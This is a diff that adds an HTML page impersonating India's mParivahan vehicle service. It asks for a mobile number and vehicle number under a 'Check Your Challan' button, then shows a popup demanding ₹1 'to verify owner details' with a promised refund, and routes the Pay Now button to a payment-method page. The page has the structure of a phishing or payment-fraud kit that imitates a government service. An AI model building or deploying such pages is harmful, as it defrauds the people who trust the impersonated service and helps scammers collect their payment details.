@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>mParivahan Login UI</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css"/>
+  <style>
+    body {
+      background-color: #f8f9fa;
+      margin: 0;
+      padding: 0;
+    }
+
+    .splash-sec {
+      min-height: 100vh;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      background-image: url("main_bg.jpg");
+      background-size: cover;
+      background-position: center;
+    }
+
+    .top-left,
+    .img-bottom {
+      height: auto;
+    }
+
+    .top-left {
+      align-self: center;
+      margin-top: 20px;
+      height: 60px;
+    }
+
+    .center-div {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100px;
+    }
+
+    .center-div img {
+      height: 80px;
+      width: 200px;
+    }
+
+    .bottom-div {
+      display: flex;
+      justify-content: center;
+      align-items: end;
+      padding: 20px;
+    }
+
+    .img-bottom {
+      height: 20px;
+      width: 35px;
+    }
+
+    .login-container {
+      display: none;
+      min-height: 100vh;
+      width: 100%;
+      background: #fff;
+      margin-top: 100px;
+      justify-content: top;
+      align-items: center;
+      flex-direction: column;
+      padding: 20px;
+    }
+
+    .logo {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 30px;
+    }
+
+    .logo img {
+      height: 60px;
+      width: auto;
+    }
+
+    h5 {
+      font-size: 28px;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+
+    .form-control {
+      height: 50px;
+      width: 90%;
+      margin-bottom: 15px;
+    }
+
+    .btn-primary {
+      width: 90%;
+      padding: 12px;
+      background-color: #e52cdc;
+      border: none;
+    }
+
+    .text {
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    .popup {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      justify-content: center;
+      align-items: center;
+      animation: fadeIn 0.5s ease-in-out;
+    }
+
+    .popup-content {
+      background: white;
+      padding: 25px;
+      text-align: center;
+      border-radius: 8px;
+      width: 80%;
+      max-width: 350px;
+      animation: popUp 0.4s ease-in-out;
+    }
+
+    .popup-content img {
+      width: 80px;
+      height: 80px;
+      margin-bottom: 10px;
+    }
+
+    .popup-content p {
+      font-size: 16px;
+      font-weight: bold;
+      color: #333;
+      margin: 10px 0;
+    }
+
+    .close-btn {
+      float: right;
+      font-weight: bold;
+      font-size: 25px;
+      cursor: pointer;
+    }
+
+    .pay-btn {
+      background: #e52cdc;
+      color: white;
+      border: none;
+      padding: 10px 15px;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .pay-btn:hover {
+      background: #e52cdc;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @keyframes popUp {
+      from { transform: scale(0.8); }
+      to { transform: scale(1); }
+    }
+  </style>
+</head>
+<body>
+
+<!-- Splash Screen -->
+<div class="splash-sec" id="splash-screen">
+  <img class="top-left" src="top_image.png" alt="Top Logo"/>
+  <div class="center-div">
+    <img class="img-center" src="center_logo.png" alt="Center Logo"/>
+  </div>
+  <div class="bottom-div">
+    <img class="img-bottom" src="bottem_logo.png" alt="Bottom Logo"/>
+  </div>
+</div>
+
+<!-- Login Container -->
+<div class="login-container" id="login-container">
+  <div class="logo">
+    <img src="logo_index.png" alt="logo"/>
+  </div>
+  <h5>Sign in to <br><strong>Your Account!</strong></h5>
+  <input
+    type="tel"
+    class="form-control"
+    id="Mobile"
+    maxlength="10"
+    placeholder="Enter Mobile No."
+    required
+  />
+  <input
+    type="text"
+    class="form-control"
+    id="mpin"
+    maxlength="13"
+    placeholder="Enter Vehicle Number"
+    required
+  />
+  <button class="btn btn-primary" id="submit-btn">Check Your Challan</button>
+  <div class="text">
+    <p>Don't have an account? <a href="#">Sign Up</a></p>
+  </div>
+</div>
+
+<!-- Payment Popup -->
+<div id="popup" class="popup">
+  <div class="popup-content">
+    <span class="close-btn" onclick="closePopup()">&times;</span>
+    <img src="https://cdn.iconscout.com/icon/free/png-512/free-upi-2085056-1747946.png?f=webp&w=512" alt="Payment Icon">
+    <p>Please Pay ₹1 To Verify Owner Details And We Will Refund Your Money Within 24 Hours.</p>
+    <button id="paybtn" class="pay-btn">Pay Now</button>
+  </div>
+</div>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    setTimeout(() => {
+      document.getElementById("splash-screen").style.display = "none";
+      document.getElementById("login-container").style.display = "flex";
+      if (localStorage.getItem("paymentStatus")) {
+        window.location.href = "final.html";
+      }
+    }, 3000);
+
+    const popup = document.getElementById("popup");
+    const mobileInput = document.getElementById("Mobile");
+    const vehicleInput = document.getElementById("mpin");
+    const submitBtn = document.getElementById("submit-btn");
+
+    submitBtn.addEventListener("click", function () {
+      const mobile = mobileInput.value.trim();
+      const vehicle = vehicleInput.value.trim();
+
+      // Show popup after validation
+      setTimeout(() => {
+        popup.style.display = "flex";
+      }, 500);
+    });
+
+    document.getElementById("paybtn").addEventListener("click", function () {
+      window.location.href = "./method.html";
+    });
+
+    window.closePopup = function () {
+      popup.style.display = "none";
+    };
+  });
+</script>
+</body>
+</html>
